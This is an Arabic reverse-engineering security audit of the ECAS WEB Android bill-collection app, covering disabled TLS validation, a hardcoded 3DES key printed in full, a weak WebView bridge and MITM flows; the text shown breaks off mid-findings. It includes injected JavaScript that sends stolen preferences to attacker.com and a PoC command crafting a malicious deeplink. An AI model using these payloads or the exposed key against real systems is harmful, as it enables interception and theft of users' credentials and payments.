# تقرير الهندسة العكسية الشامل
## التطبيق: AbbasiyCashiers — ECAS WEB
## النسخة: v18.4 (versionCode: 18)

---

| البند | القيمة |
|------|--------|
| **تاريخ التقرير** | 2026-05-22 |
| **المُحلِّل** | باحث أمني — تحليل تعليمي/تدقيقي |
| **اسم الحزمة** | `com.egy.webpaymentapp` |
| **اسم العرض** | ECAS WEB |
| **MD5** | `257aedaa619545c42a72b6e9023f7703` |
| **SHA256** | `0204b3569727de3f46bdd2f0c0545d7b0088e0d51f1f48e8ea7fa0cf5167e6b2` |
| **الحجم** | 19,502,156 بايت (~19 MB) |
| **التصنيف** | تطبيق نقاط بيع / تحصيل فواتير (POS / Field Collection) |
| **الجمهور المستهدف** | محصِّلو فواتير الكهرباء أو خدمات شركة "United Power" |
| **مستوى الخطورة الإجمالي** | 🔴 **عالٍ جداً** — 6 ثغرات حرجة |

---

## ⚠️ إخلاء مسؤولية

هذا التقرير عمل بحثي أكاديمي/تدقيقي لأغراض تعليمية ولمساعدة مطوري التطبيق في تحسين أمانه. **لا يُسمح** باستخدام النتائج لاستغلال أنظمة لا تملكها أو ليس لديك إذن صريح بفحصها. الباحث لا يتحمل مسؤولية إساءة الاستخدام.

---

## الفهرس

1. [الملخص التنفيذي](#executive-summary)
2. [منهجية التحليل](#methodology)
3. [التحقق من سلامة الملف والتوقيع](#integrity)
4. [البنية العامة للتطبيق](#architecture)
5. [تحليل AndroidManifest.xml](#manifest)
6. [التحليل الساكن العميق](#static)
7. [تحليل آليات التشفير](#crypto)
8. [تحليل WebView والـ JS-Bridge](#webview)
9. [آليات الحماية المُكتشفة (وعدمها)](#protections)
10. [خرائط المسارات الحرجة](#flows)
11. [نتائج الفحص الأمني التفصيلية](#findings)
12. [مخططات استغلال (PoC)](#poc)
13. [التحليل الديناميكي - ملاحظات وتوصيات](#dynamic)
14. [التوصيات والإصلاحات](#recommendations)
15. [المراجع](#references)

---

## 1. الملخص التنفيذي <a name="executive-summary"></a>

تطبيق **ECAS WEB** (داخلياً `com.egy.webpaymentapp`) هو تطبيق Android **لتحصيل الفواتير الميدانية**، يستخدمه موظفون متجولون لتسجيل مدفوعات العملاء، قراءة العدادات، وحفظ مواقع العملاء جغرافياً. يدعم التطبيق طابعات Bixolon المحمولة عبر Bluetooth ويعتمد على نموذج Hybrid (Native Android + WebView لعرض التقارير).

### نتائج التحليل الرئيسية:

| المحور | الحالة | التفصيل |
|--------|--------|---------|
| **التشويش (Obfuscation)** | 🟡 ضعيف | ProGuard/R8 بسيط — إعادة تسمية حروف فقط، الكود قابل للقراءة بـ JADX بسهولة |
| **حماية ضد RE** | 🔴 معدومة | لا يوجد root detection، anti-debug، anti-emulator، أو tamper detection |
| **أمان الشبكة** | 🔴 ضعيف جداً | TrustManager معطل، HostnameVerifier يقبل أي اسم، WebView يتجاوز SSL errors |
| **أمان التشفير** | 🔴 ضعيف | مفتاح DESede مُضَمَّن، ECB mode، خوارزمية مهجورة |
| **أمان WebView** | 🔴 ضعيف | UniversalAccessFromFileURLs مفعّل، JS-bridge مكشوف بدون حماية |
| **أمان البيانات** | 🟠 متوسط | بيانات الجلسة في SharedPreferences بنص واضح |
| **سطح الهجوم** | 🔴 كبير | Deeplink خارجي + جمع IMEI + أذونات مفرطة |

### الإحصائيات:
- **6 ثغرات حرجة (Critical)**
- **5 ثغرات عالية (High)**
- **7 ثغرات متوسطة (Medium)**
- **2 ثغرات منخفضة (Low)**

### التوصية الإستراتيجية:
**يُنصح بشدة بسحب هذا الإصدار من الإنتاج** فوراً وإعادة معمارية طبقة الأمان قبل أي إعادة نشر. الثغرات في طبقة الشبكة وحدها تكفي لتسريب جميع البيانات المالية للعملاء عند أي هجوم MITM بسيط.

---

## 2. منهجية التحليل <a name="methodology"></a>

تم اتباع منهجية OWASP MASTG (Mobile Application Security Testing Guide) المعيارية:

### 2.1 الأدوات المستخدمة

| الأداة | الإصدار | الغرض |
|--------|---------|------|
| **APKTool** | 2.7.0 | فك تجميع الموارد و AndroidManifest + توليد Smali |
| **JADX** | 1.5.0 | فك تجميع DEX إلى Java |
| **keytool** | OpenJDK 17 | فحص شهادة التوقيع |
| **unzip / strings / file** | Standard Unix | فحص بنية ZIP و ELF |
| **grep / find** | GNU coreutils | بحث الأنماط في الكود |
| **pycryptodome** | latest | إثبات استغلال التشفير |

### 2.2 خطوات التحليل المُنفَّذة

```
1. تحميل الملف من المصدر
2. التحقق من السلامة (MD5/SHA256)
3. فحص بنية الـ ZIP (unzip -l)
4. استخراج وفحص شهادة التوقيع (CERT.RSA)
5. فك التجميع بـ APKTool → Smali + Resources
6. فك التجميع بـ JADX → Java sources (88% نجاح، 21 خطأ بسيط)
7. تحليل AndroidManifest.xml المُفكَّك
8. تتبع نقاط الدخول (LoginActivity كنقطة Launcher)
9. تتبع منطق الـ business logic (Login → Main → Operations/Webview)
10. تحليل طبقة الشبكة (TrustManager, HostnameVerifier)
11. تحليل التشفير (RSA + DESede + HMAC)
12. تحليل أمان WebView و JS-Bridge
13. البحث عن backdoors / hardcoded secrets / weak crypto
14. التوثيق وكتابة PoC
```

### 2.3 لماذا لم نُجرِ تحليلاً ديناميكياً كاملاً؟

البيئة المتوفرة (Linux sandbox) لا تدعم Android emulator، لذا تم الاكتفاء بالتحليل الساكن. ومع ذلك، تم استدلال السلوك الديناميكي من الكود ووضع توصيات لمن يمتلك بيئة كاملة (راجع قسم 13).

---

## 3. التحقق من سلامة الملف والتوقيع <a name="integrity"></a>

### 3.1 خصائص الملف

```
Filename: AbbasiyCashiers.apk (originally: TiRnOPtnNaKPCTIY.apk)
Type: Android package (APK), with AndroidManifest.xml
Size: 19,502,156 bytes
Entries: 1,058 files
classes.dex: 4,838,524 bytes (single dex - no multidex needed despite MultiDexApplication declaration)
```

### 3.2 شهادة التوقيع الرقمي

```
Owner:      CN=Yahya Aljamal, OU=United Power, O=United Power, L=Sanaa, ST=Sanaa, C=YE
Issuer:     CN=Yahya Aljamal, OU=United Power, O=United Power, L=Sanaa, ST=Sanaa, C=YE
            (Self-signed)
Serial:     611c481b
Valid:      Fri Aug 06 02:26:09 UTC 2021  →  Tue Jul 31 02:26:09 UTC 2046
Algorithm:  SHA256withRSA, 2048-bit RSA
SHA1:       25:B2:36:BF:3F:CF:9B:6B:6A:03:4B:D8:AC:12:C0:90:3C:5A:8D:1C
SHA256:     C6:BA:D5:38:29:26:09:34:0D:53:35:0D:C3:ED:9E:88:F3:2D:A3:11:26:87:78:AB:69:1C:87:13:10:99:68:65
```

### 3.3 ملاحظات Forensics

🔍 **اكتشاف هوية المُصدِر:**
- المُوقِّع: **يحيى الجمل** (Yahya Aljamal) من **شركة United Power** في **صنعاء، اليمن**
- اسم الحزمة الداخلي `com.egy.webpaymentapp` يحتوي على `egy` (مختصر Egypt) مما يخلق **تضارباً** مع موقع المُصدِر اليمني — احتمالات:
  - تطبيق مُطوَّر في مصر ثم اشترته أو نسخته شركة يمنية
  - المُطوِّر الأصلي مصري يعمل مع شركة يمنية
  - استخدام domain placeholder عشوائياً
- **خادم API الافتراضي:** `abbasiy.yedns.org:8057` — يستخدم خدمة DNS الديناميكي اليمنية `yedns.org` ⇒ يؤكد الانتماء لشركة يمنية
- **اسم التطبيق `AbbasiyCashiers`** — على الأرجح يعود لشركة "العباسية" للكهرباء أو الطاقة في اليمن

✅ **سلامة التوقيع:** الشهادة سليمة و2048-bit RSA — قوية رياضياً.
⚠️ **مدة الصلاحية:** 25 عاماً (2021-2046) — أطول من المعتاد، يدل على عدم التخطيط لتدوير المفاتيح.

---

## 4. البنية العامة للتطبيق <a name="architecture"></a>

### 4.1 مكدس التقنيات (Tech Stack)

```
┌─────────────────────────────────────────────────────────────┐
│  UI Layer (Java/Kotlin Activities + XML Layouts)            │
│  ├─ Native: LoginActivity, MainActivity, OprationsActivity  │
│  └─ Hybrid: WebviewActivity (with assets/myweb/*.html)      │
├─────────────────────────────────────────────────────────────┤
│  Business Logic                                              │
│  ├─ c.b.a.* (app-internal, obfuscated)                      │
│  └─ Inline in Activities                                     │
├─────────────────────────────────────────────────────────────┤
│  Network Layer: Volley library (c.a.b.*)                    │
│  ├─ Custom TrustManager (DISABLED) ⚠️                       │
│  └─ JSON via Gson                                            │
├─────────────────────────────────────────────────────────────┤
│  Storage: SharedPreferences (USER_DETAILS_PREF)             │
│  └─ Plaintext User + Tokens ⚠️                              │
├─────────────────────────────────────────────────────────────┤
│  Hardware/Peripherals (JPOS + Bixolon SDK)                  │
│  ├─ Bluetooth Printers (Bixolon SPP-Rxxx)                   │
│  ├─ Camera (CWAC-Cam2 library)                              │
│  └─ Bluetooth Scale/Cash Drawer support (unused?)           │
└─────────────────────────────────────────────────────────────┘
```

### 4.2 المكتبات الخارجية المُكتشفة

| المكتبة | الإصدار/المسار | الغرض |
|---------|----------------|------|
| **AndroidX** | متعدد | إطار العمل القياسي |
| **Volley** (`c.a.b.*`) | غير محدد | HTTP requests |
| **Gson** (`c.c.b.*`) | غير محدد | JSON serialization |
| **JPOS** | java POS | إطار نقاط بيع قياسي |
| **Bixolon SDK** (`a.a.*`, `c.e.a.*`) | غير محدد | طابعات Bixolon |
| **OpenCV** (`libopencv_java.so`) | غير محدد | ربما لمعالجة صور العدادات |
| **Karumi Dexter** (`com.karumi.dexter`) | غير محدد | إدارة Runtime Permissions |
| **Material Design** (`com.google.android.material`) | غير محدد | UI components |
| **Google Play Services** | متعدد | Maps, Location, Places |
| **CWAC-Cam2** (`c.d.a.*`) | (CommonsWare) | كاميرا متقدمة |
| **Bootstrap 4.5.3** | في assets/myweb | CSS framework للـ WebView |
| **Font Awesome 4.7.0** | في assets/myweb | أيقونات |
| **Apache Xerces** (`mf.org.apache.xerces`) | معاد تسميته | XML parser (مع JPOS) |

### 4.3 مكتبات Native (.so files)

| المكتبة | المعمارية | الحجم النسبي | الغرض |
|---------|-----------|--------------|------|
| `libJoinImage.so` | ARM, x86, x86_64 | متوسط | دمج صور (للتقارير المطبوعة؟) |
| `libbxlpdf.so` | ARM, x86, x86_64 | كبير | Bixolon PDF printing |
| `libbxlpdf-jni.so` | x86, x86_64 فقط | متوسط | JNI bindings للسابق |
| `libcomm_serial_port.so` | ARM, x86, x86_64 | صغير | منفذ تسلسلي (Java_cn_pda_serialport_SerialPort_*) — مكتبة صينية لـ POS |
| `libopencv_java.so` | ARM فقط | كبير جداً | OpenCV - معالجة صور |

🔍 **ملاحظات:**
- `libcomm_serial_port.so` يكشف JNI symbols لـ `cn.pda.serialport.SerialPort` — مكتبة شائعة في أجهزة POS الصينية الرخيصة (PDA terminals)
- غياب `libopencv_java.so` على x86/x86_64 يشير إلى أن التطبيق مُحسَّن لأجهزة ARM فقط (الـ POS terminals عادةً ARM)
- لا يوجد JNI calls من كود Java للتطبيق الرئيسي — مكتبات native تخدم المكتبات الخارجية فقط

### 4.4 خريطة الـ Activities وتدفق المستخدم

```
                    [LAUNCH]
                       │
                       ▼
              ┌────────────────┐
              │ LoginActivity  │◄──── deeplink: https://ecas.web.link/?ip=...
              │   (exported)   │
              └────────┬───────┘
                       │
              ┌────────┴────────┐
              ▼                 ▼
       (server URL              (login API)
        from deeplink)          /api/Users/getAppPK
              │                 /api/Users/Login
              └────────┬────────┘
                       │
                       ▼
              ┌────────────────┐
              │  MainActivity  │
              └────────┬───────┘
                       │
       ┌───────────────┼───────────────┐──────────┐
       ▼               ▼               ▼          ▼
┌──────────────┐ ┌─────────────┐ ┌───────────┐ ┌──────────────────┐
│ OperatActivity│ │ WebView     │ │ ChangePass│ │ Setting_Printer  │
│ (Pay/Read/   │ │  Activity   │ │  Activity │ │   Activity       │
│  CustLoc)    │ │ (Reports)   │ │           │ │                  │
└──────┬───────┘ └─────┬───────┘ └───────────┘ └──────┬───────────┘
       │               │                              │
       ▼               ▼                              ▼
   [Camera +      [JS-Bridge:                    [Bixolon
    Bluetooth      mobile.GetPayments...          Bluetooth
    Printer]       printPdfReport...]             Discovery]
```

---

## 5. تحليل AndroidManifest.xml <a name="manifest"></a>

تم إجراء تحليل تفصيلي في الملف المنفصل: [`04_manifest_analysis/manifest_analysis.md`](../04_manifest_analysis/manifest_analysis.md). أهم النقاط:

### 5.1 ملخص الأذونات (29 إذن)

- **🔴 أذونات حساسة جداً (7):** READ_PHONE_STATE, ACCESS_FINE_LOCATION, CAMERA, MANAGE_EXTERNAL_STORAGE, REQUEST_INSTALL_PACKAGES, DOWNLOAD_WITHOUT_NOTIFICATION, ACCESS_SUPERUSER
- **🟠 أذونات متوسطة (8):** READ/WRITE_EXTERNAL_STORAGE, ACCESS_COARSE_LOCATION, CALL_PHONE, RECEIVE_BOOT_COMPLETED, ...
- **⚪ عادية (11):** INTERNET, Bluetooth*, ACCESS_NETWORK/WIFI_STATE, FOREGROUND_SERVICE
- **⚠️ أسماء خاطئة (3):** `Manifest.permission.*` (لن تعمل، خطأ من المطور)

### 5.2 المكونات الرئيسية

| المكون | العدد |
|--------|------|
| Activities (مصرح بها في app) | 6 |
| Activities (من مكتبات) | 2 (Dexter, GoogleApi) |
| Services | **0** |
| Broadcast Receivers | **0** |
| Content Providers | 1 (FileProvider غير مُصدَّر) |

### 5.3 العلامات الأمنية الحرجة

```xml
android:allowBackup="false"            ✅ جيد
android:usesCleartextTraffic="true"    🔴 خطير
android:requestLegacyExternalStorage="true"  ⚠️
networkSecurityConfig: غير موجود       🔴
android:debuggable: غير موجود (= false) ✅
```

### 5.4 Deeplink سطح هجوم

```xml
<data android:host="ecas.web.link" android:scheme="https"/>
```
- **بدون `android:autoVerify`** = أي تطبيق يمكن أن يدّعي معالجة هذا الرابط
- يقبل معامل `?ip=` المُشفَّر — يُغيّر عنوان الخادم (راجع F-06)

---

## 6. التحليل الساكن العميق <a name="static"></a>

تم استخراج 2,406 صنف من DEX، منها **62 صنفاً تابعاً لـ `com.egy.webpaymentapp`** + **888 ملف غير تابع لمكتبات معروفة** (معظمها بأسماء حرفين بسبب ProGuard).

### 6.1 خريطة الحزم الرئيسية

```
com.egy.webpaymentapp/
├── R.java                          # ثوابت الموارد
├── Screens/
│   ├── LoginActivity.java          ⭐ نقطة الدخول + deeplink handler
│   ├── MainActivity.java           # القائمة الرئيسية
│   ├── OprationsActivity.java      # عمليات الدفع/القراءة (624 سطر)
│   ├── ChangePassActivity.java
│   ├── Setting_Printer_Activity.java
│   ├── web/
│   │   ├── WebviewActivity.java    # WebView + JS-bridge
│   │   ├── i.java                  ⭐ JS Interface (window.mobile)
│   │   ├── h.java                  # WebViewClient (يتجاوز SSL)
│   │   └── ...
│   └── (a..z, a0..h0).java         # مساعدات (callbacks, runnables)
├── BixlonPrinterManger/
│   └── ScanActivity.java
└── webapi/models/
    ├── User.java                   # نموذج المستخدم
    ├── Payinfo.java                # معلومات الدفع
    └── (a..d).java                 # نماذج DTO

c.b.a.*  (الكود الأساسي للتطبيق، مُشَوَّش)
├── c.java                          ⭐ SharedPreferences wrapper (USER_DETAILS_PREF)
├── d.java                          # Utilities
├── f/
│   ├── c.java                      ⭐ API client (Volley wrapper)
│   ├── b.java                      ⭐ Auth APIs (login, changePass, getAppPK)
│   ├── d.java                      🔴 TrustManager المُعطل
│   └── a.java                      # Request class
├── a.*, b.*, e.*                   # نماذج، layouts، helpers

android.support.v4.media.session.MediaSessionCompat.java  
   ⚠️ هذا الصنف القياسي تم استبداله/حقنه بدوال خاصة بالتطبيق:
   - .a()  → RSA encrypt password
   - .B()  → HMAC-SHA1+SHA256 signing (dead code?)
   - .C()  → Get cached user from prefs
   - .D()  → Get device ID (IMEI on old Android)
   - .r()  → DESede DECRYPT (hardcoded key)
   - .s()  → DESede ENCRYPT (hardcoded key)
   - .z()  → Get missing permissions list
```

### 6.2 سلاسل (Strings) حساسة مُكتشفة

| السلسلة | الموقع | الخطورة |
|---------|--------|---------|
| `"m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##"` | MediaSessionCompat.r/s | 🔴 مفتاح تشفير ثابت |
| `"https://abbasiy.yedns.org:8057/payment"` | c/b/a/f/c.java | ℹ️ خادم API الافتراضي |
| `"USER_DETAILS_PREF"` | c.b.a.c | ℹ️ اسم ملف الـ Preferences |
| `"APP_PK_KEY"`, `"APP_SERVER_IP_KEY"`, `"APP_USER_KEY"`, `"APP_AREADATALIST_KEY"`, `"APP_USER_LOC_KEY"`, `"APP_SERVER_CER_KEY"` | c.b.a.c | ℹ️ مفاتيح SharedPreferences |
| `"Bearer "` | c/b/a/f/c.java | ℹ️ JWT-style auth |
| `"HmacSHA1"`, `"SHA-256"`, `"RSA/ECB/PKCS1PADDING"`, `"DESede"` | MediaSessionCompat | 🟡 خوارزميات التشفير |
| `"/api/Users/Login"` وغيرها | متعدد | ℹ️ Endpoints |

### 6.3 الفئات (Classes) المُكتشفة الحرجة

#### `c.b.a.c` — SharedPreferences Wrapper (Singleton)
- ملف: `USER_DETAILS_PREF`
- يخزن: token (`APP_USER_KEY`)، server URL (`APP_SERVER_IP_KEY`)، public key (`APP_PK_KEY`)
- ⚠️ بنص واضح، بدون تشفير، بدون استخدام EncryptedSharedPreferences

#### `c.b.a.f.c` — Volley HTTP Wrapper
- التابتة `f1899b = "https://abbasiy.yedns.org:8057/payment"` (خادم افتراضي)
- يطبق SSL bypass للـ HTTPS عبر `c.b.a.f.d` (TrustManager فارغ)
- HostnameVerifier يقبل أي اسم
- يضيف `Authorization: Bearer <token>` تلقائياً

#### `c.b.a.f.b` — Auth Helpers
- `b()` → `getAppPK` (جلب المفتاح العام)
- `c()` → `Login` (تشفير الباسوورد بـ RSA، إرسال)
- `a()` → `changePasswordRequest`

#### `i.java` (في Screens/web/) — JS Bridge
- `@JavascriptInterface GetPaymentsRequest(String)` → استدعاء `/api/Payment/GetPaymentsReportData`
- `@JavascriptInterface GetReadingDataRequest(String)` → استدعاء `/api/Payment/GetReadingListData`
- `@JavascriptInterface ShareReport()` → مشاركة عبر intent
- `@JavascriptInterface printPdfReport(String)` → طباعة PDF
- `@JavascriptInterface sharexPdfReport(String)` → مشاركة PDF
- `@JavascriptInterface reloadWebPage()` → إعادة تحميل

⚠️ **خطر:** أي صفحة ويب يتم تحميلها في WebView (محلية أو بعيدة) تستطيع استدعاء `window.mobile.*` لتنفيذ هذه العمليات.

---

## 7. تحليل آليات التشفير <a name="crypto"></a>

التطبيق يستخدم **ثلاثة مستويات** من التشفير:

### 7.1 المستوى 1: RSA لتشفير كلمات المرور (الأكثر أماناً)

```
Flow:
  Client → GET /api/Users/getAppPK
  Server → JSON { "a": "modulus_base64&exponent_base64" }
  Client stores key in SharedPreferences as APP_PK_KEY
  
  On Login/ChangePass:
  encrypted_password = RSA-PKCS1v1.5-Encrypt(server_public_key, plaintext_password)
  encrypted_device_id = RSA-PKCS1v1.5-Encrypt(server_public_key, IMEI/AndroidID)
  Send to /api/Users/Login
```

**التقييم:** 
- ✅ خوارزمية RSA + PKCS#1 v1.5 padding صحيحة (وإن كانت قديمة - OAEP أفضل)
- ✅ المفتاح العام ديناميكي (يتغير من الخادم)
- 🔴 **ولكن** تعطيل TLS validation يجعل هذه الحماية بلا قيمة — المهاجم MITM يقدم مفتاحه الخاص

### 7.2 المستوى 2: DESede (3DES) لتشفير سلاسل التطبيق

```
Hardcoded:  SECRET = "m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##"
Key derivation: 
   md5(SECRET) = 0x5f44eaf8424b7d04365abbda5232a2f5
   key24 = md5 || md5[0:8]
        = 5f44eaf8424b7d04365abbda5232a2f5 5f44eaf8424b7d04 (24 bytes)
Mode: ECB (default in Java for "DESede" cipher)
Padding: PKCS5 (Java default)
```

**استخدام:** Deeplink IP parameter handling
- `s(str)` = encrypt (لكن غير مستخدم في كود التطبيق - مستخدم خارجياً لبناء deeplinks!)
- `r(str)` = decrypt (المستخدم في LoginActivity لفك معامل `?ip=`)

**التقييم:**
- 🔴 **3DES مهجور** (NIST deprecation: 2023)
- 🔴 **ECB mode** يكشف أنماط البيانات (Penguin attack)
- 🔴 **مفتاح ثابت** يكسر تماماً أي ميزة سرية
- 🔴 **بدون IV** (ECB لا يستخدم IV)
- 🔴 **بدون authentication** (لا MAC/GCM) — يمكن للمهاجم تعديل الـ ciphertext

**استغلال PoC:** انظر [`06_findings/decrypt_ecas_poc.py`](../06_findings/decrypt_ecas_poc.py)

```bash
# مثال على عمل PoC:
$ python3 decrypt_ecas_poc.py craft attacker.com:8057/payment
[+] Malicious URL:
    https://ecas.web.link/?ip=Wp%2B%2FUR%2BqaB8XMzJSU%2B...
```

### 7.3 المستوى 3: HMAC-SHA1 + SHA-256 (يبدو غير مستخدم)

```java
B(str, str2, str3) {
    data = str + "@" + str2 + "@" + str3
    key  = str3.substring(str3.length()/2)  // نصف str3 الثاني
    hmac = HmacSHA1(key, data)
    return SHA256(Base64(hmac)).toUpperCase()
}
```

**التقييم:**
- 🟡 خوارزمية الـ MAC غير قياسية (مزيج HMAC-SHA1 ثم SHA-256 ثانياً بلا فائدة أمنية)
- 🟡 المفتاح مشتق من جزء من البيانات نفسها = **عيب أمني** (لا توجد سرية حقيقية)
- ⚠️ في الكود المُحلَّل، لم نجد استدعاءً لهذه الدالة — إما **dead code** أو تُستدعى من مسار غير مكتشف

### 7.4 Token Authentication

```java
// In c.b.a.f.c.a()
hashmap.put("Authorization", "Bearer " + user.token);
```

- ✅ نمط Bearer Token قياسي
- ⚠️ Token يُخزَّن بنص واضح في SharedPreferences
- ⚠️ لا توجد آلية انتهاء صلاحية مرئية في الـ Client (يعتمد على 401 من الخادم)
- ⚠️ عند 401، يتم استدعاء `f0` (logout dialog)

---

## 8. تحليل WebView والـ JS-Bridge <a name="webview"></a>

### 8.1 إعدادات WebView (سيئة للغاية)

```java
u.getSettings().setDomStorageEnabled(true);              // ⚠️
u.getSettings().setAllowFileAccess(true);                // ⚠️
u.getSettings().setAllowContentAccess(true);
u.getSettings().setDatabaseEnabled(true);
u.getSettings().setDomStorageEnabled(true);              // مكرر
u.getSettings().setAllowUniversalAccessFromFileURLs(true); // 🔴 خطير
u.getSettings().setJavaScriptEnabled(true);              // مطلوب لكن خطير مع ما سبق
u.addJavascriptInterface(new i(this, this), "mobile");
```

### 8.2 سيناريو هجوم XSS → Native RCE

**الفرضية:** المهاجم يحقن JavaScript في صفحة من خادم API (لأن TLS معطل، MITM ممكن)

```javascript
// Injected script via MITM into a server-rendered HTML
fetch('file:///data/data/com.egy.webpaymentapp/shared_prefs/USER_DETAILS_PREF.xml')
  .then(r => r.text())
  .then(data => {
      // exfiltrate all stored tokens, server URL, public key
      fetch('https://attacker.com/exfil', {method:'POST', body: data});
  });

// Trigger native methods to print arbitrary data
window.mobile.printPdfReport('<malicious html>');
window.mobile.sharexPdfReport(JSON.stringify(stolenData));
```

**شروط الاستغلال:**
1. MITM على الشبكة (محقق بسبب F-01..F-03)
2. صفحة من الخادم تُحمَّل في WebView (محقق - WebviewActivity)
3. الصفحة `file:///android_asset/myweb/vReport.html` يمكن تحميل سكربتات من URLs أخرى (محقق - UniversalAccessFromFileURLs)

### 8.3 JS Bridge Surface

ستة طرق `@JavascriptInterface` مكشوفة لكل ما يُحمَّل في WebView:

| الدالة | الغرض | الخطر |
|--------|------|------|
| `GetPaymentsRequest(String)` | جلب تقارير الدفع | كشف بيانات مالية |
| `GetReadingDataRequest(String)` | جلب القراءات | كشف بيانات العملاء |
| `ShareReport()` | مشاركة عبر intent | inter-app data leak |
| `printPdfReport(String)` | طباعة محتوى | تنفيذ طباعة غير مرغوبة |
| `sharexPdfReport(String)` | مشاركة PDF | تسريب ملفات |
| `reloadWebPage()` | إعادة تحميل | DoS بسيط |

🔴 **ملاحظة حاسمة:** على Android < 17 (KitKat) يمكن استدعاء **أي method** عبر `addJavascriptInterface` (ثغرة Object.getClass).getRuntime().exec). minSdk=19 يحمي من هذا، لكن على Android 4.4 الجذور قد تكون مكشوفة جزئياً.

---

## 9. آليات الحماية المُكتشفة (وعدمها) <a name="protections"></a>

### 9.1 ما هو موجود ✅
- ✅ `android:allowBackup="false"` (يمنع adb backup)
- ✅ معظم Activities `exported="false"` افتراضياً
- ✅ FileProvider بدلاً من `file://` URIs لمشاركة الصور
- ✅ تشويش بسيط بـ R8/ProGuard (إعادة تسمية أحرف)
- ✅ تشفير كلمات المرور بـ RSA قبل الإرسال

### 9.2 ما هو مفقود 🔴

| الحماية | الحالة | الأهمية |
|---------|--------|---------|
| Root detection | ❌ غير موجود | متوسطة |
| Anti-debug (ptrace, fork) | ❌ غير موجود | متوسطة |
| Anti-emulator | ❌ غير موجود | منخفضة |
| Anti-tampering (signature check) | ❌ غير موجود | عالية |
| Anti-hook (Frida/Xposed detection) | ❌ غير موجود | متوسطة |
| Code integrity (CRC of dex) | ❌ غير موجود | متوسطة |
| Certificate pinning | ❌ غير موجود | **حرجة** |
| SafetyNet/Play Integrity | ❌ غير موجود | عالية |
| Native string obfuscation | ❌ غير موجود | منخفضة |
| Class encryption (DexGuard) | ❌ غير موجود | منخفضة |
| Memory anti-dump | ❌ غير موجود | منخفضة |
| Screenshot prevention (`FLAG_SECURE`) | ❌ غير موجود | متوسطة (تطبيق مالي) |

**الخلاصة:** التطبيق يفتقر **تماماً** لأي طبقة دفاع ضد الهندسة العكسية. أي مبتدئ مع JADX يستطيع قراءة الكود في دقائق.

### 9.3 مدى صعوبة Reverse Engineering هذا التطبيق

| المهمة | الصعوبة | الوقت التقريبي |
|--------|----------|----------------|
| فهم البنية العامة | 🟢 سهل جداً | 30 دقيقة |
| استخراج المفتاح الثابت | 🟢 سهل جداً | 5 دقائق |
| تجاوز SSL pinning | 🟢 ليس مطلوباً (مُعطل أصلاً) | 0 دقيقة |
| استخراج Tokens المخزنة | 🟢 سهل (ADB shell على جهاز مروت) | 5 دقائق |
| بناء PoC للـ deeplink | 🟢 سهل (الـ PoC المرفق) | 15 دقيقة |
| تعديل التطبيق وإعادة تجميعه | 🟡 متوسط (apktool + apksigner) | 30 دقيقة |

---

## 10. خرائط المسارات الحرجة <a name="flows"></a>

### 10.1 تدفق تسجيل الدخول (Login Flow)

```
User opens app
   │
   ▼
LoginActivity.onCreate()
   │ → check permissions (Dexter library)
   │ → if Android 11+: check Environment.isExternalStorageManager()
   │
   ▼
LoginActivity.A()
   │ → SET version label "Ver Ecas v18.4"
   │ → LOAD cached User from prefs (auto-fill branch + userid)
   │ → If deeplink data exists:
   │      ip = MediaSessionCompat.r(s(query["ip"]))   // 🔴 DESede ENCRYPT-then-DECRYPT
   │      saveToPrefs("APP_SERVER_IP_KEY", ip)
   │      Toast("تمت العملية بنجاح")
   │
   ▼
Background: c.b.a.f.b.b()
   │ → POST /api/Users/getAppPK
   │ → Response: { "a": "modulus&exponent" }
   │ → saveToPrefs("APP_PK_KEY", pubkey)
   │
   ▼
User taps Login button
   │ → Validate non-empty fields
   │ → CHECK MAGIC BACKDOOR: if ("1"/"1"/"1") → open settings ⚠️
   │ → If no public key: re-fetch then login
   │ → Else: LoginActivity.y() → c.b.a.f.b.c()
   │
   ▼
c.b.a.f.b.c()
   │ → user.r(RSA_encrypt(plaintext_password))
   │ → user.q(RSA_encrypt(device_id))     // 🟡 IMEI on old Android
   │ → POST /api/Users/Login { branch, username, encrypted_pass, encrypted_devid }
   │
   ▼
Server response → save user object → save token → MainActivity
```

### 10.2 تدفق عملية الدفع (Payment Flow)

```
MainActivity → btn_pay → OprationsActivity (OP_TYP=1)
   │
   ▼
User enters customer number → onEditorAction → X(customer_no)
   │ → POST /api/Payment/GetCustomersData { custNo, branch, opType }
   │ → Response: customer details (name, balance)
   │
   ▼
Display customer info (name, balance, address, "previous reading")
   │
   ▼
User enters payment amount + optional note
   │
   ▼
Save button → validate → confirm dialog →
   │ → POST /api/Payment/saveBillRequest { user, custNo, amount, note }
   │
   ▼
Response: SUCCESS or error
   │ → if user has Bixolon printer: print receipt
   │ → if has gps_enabled: capture location → /api/Payment/saveCustLocation
```

### 10.3 تدفق هجوم MITM المتكامل

```
                     ┌─────────────────────────┐
                     │  Attacker on same WiFi  │
                     └────────────┬────────────┘
                                  │
                                  ▼
                          ┌──────────────┐
                          │  mitmproxy   │  Listen on 0.0.0.0:8080
                          │  --insecure  │
                          └──────┬───────┘
                                 │
       ┌─────────────────────────┼─────────────────────────┐
       │                         │                         │
       ▼                         ▼                         ▼
   GET /api/Users/getAppPK    POST /Login           POST /saveBillRequest
       │                         │                         │
  Replace server pubkey      Decrypt password         Capture/modify
  with attacker's pubkey     with attacker's privkey   payment amounts
       │                         │                         │
       ▼                         ▼                         ▼
  App stores attacker's      Attacker now knows        Attacker logs all
  key in APP_PK_KEY           plaintext password         financial transactions
       │                         │
       └────────┬────────────────┘
                │
                ▼
       Optionally forward to real server
       to maintain victim's normal experience
```

---

## 11. نتائج الفحص الأمني التفصيلية <a name="findings"></a>

ملخص جدول النتائج موجود في [`06_findings/security_findings_summary.md`](../06_findings/security_findings_summary.md). أبرز 5 ثغرات:

### 🔴 F-01: تعطيل كامل لـ TLS Trust Validation
**OWASP MASVS:** MSTG-NETWORK-3 | **CVSS:** ~9.8 (Critical)
```java
public void checkServerTrusted(X509Certificate[] x509CertificateArr, String str) {
    // Empty - يقبل أي شهادة
}
```
**التأثير:** اعتراض كامل لجميع طلبات API.

### 🔴 F-04: مفتاح DESede مُضَمَّن
**OWASP MASVS:** MSTG-CRYPTO-1 | **CVSS:** ~7.5 (High)
```java
"m#Y@C%P*e&B*H(#Z^)a_X-r*X*&##"
```
**التأثير:** تشفير الـ deeplink غير سرّي - يمكن لأي شخص تشفير IP خاص به.

### 🔴 F-06: Deeplink يسمح بتغيير IP الخادم
**OWASP MASVS:** MSTG-PLATFORM-3 | **CVSS:** ~9.0 (Critical)
